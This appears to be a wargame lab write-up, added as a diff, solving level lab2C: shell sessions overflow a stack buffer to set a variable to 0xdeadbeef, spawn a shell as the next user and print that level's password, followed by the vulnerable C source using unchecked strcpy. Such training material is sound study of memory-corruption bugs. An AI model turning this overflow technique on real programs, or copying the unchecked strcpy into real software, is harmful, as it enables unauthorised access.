@@ -1,0 +1,62 @@
+lab2C@warzone:/levels/lab02$ ./lab2C $(python -c 'print "A" * 31 + "\xad\x86\x04\x08"')
+Not authenticated.
+set_me was 1094795585
+You did it.
+$ id       
+uid=1006(lab2C) gid=1007(lab2C) euid=1007(lab2B) groups=1008(lab2B),1001(gameuser),1007(lab2C)
+$ cat /home/lab2B/.pass
+1m_all_ab0ut_d4t_b33f
+$
+
+
+Overflow the char buf[16] into "int set_me" variable. Since the data type of
+"set_me" is integer, buffer is converted to integer.
+
+
+lab2C@warzone:/levels/lab02$ ./lab2C $(python -c 'print "A" * 15 + "AAAA"')
+Not authenticated.
+set_me was 1094795585
+
+>>> hex(1094795585)
+'0x41414141'
+
+>>> int('0xdeadbeef', 16)
+3735928559
+
+
+
+lab2C@warzone:/levels/lab02$ ./lab2C $(python -c 'print "A" * 15 + "\xef\xbe\xad\xde"')
+You did it.
+$ cat /home/lab2B/.pass
+1m_all_ab0ut_d4t_b33f
+$
+
+Vulnerable Code
+===============
+
+Multiple ways to exploit
+
+
+
+int main(int argc, char** argv)
+{
+	if(argc != 2)
+	{
+		printf("usage:\n%s string\n", argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	int set_me = 0;
+	char buf[15];				# Buffer overflow moves up towards int set_me.
+	strcpy(buf, argv[1]);		# intpu can overflow buf, no strlen sanitation
+
+	if(set_me == 0xdeadbeef)
+	{
+		shell();
+	}
+	else
+	{
+		printf("Not authenticated.\nset_me was %d\n", set_me);
+	}
+
+	return EXIT_SUCCESS;
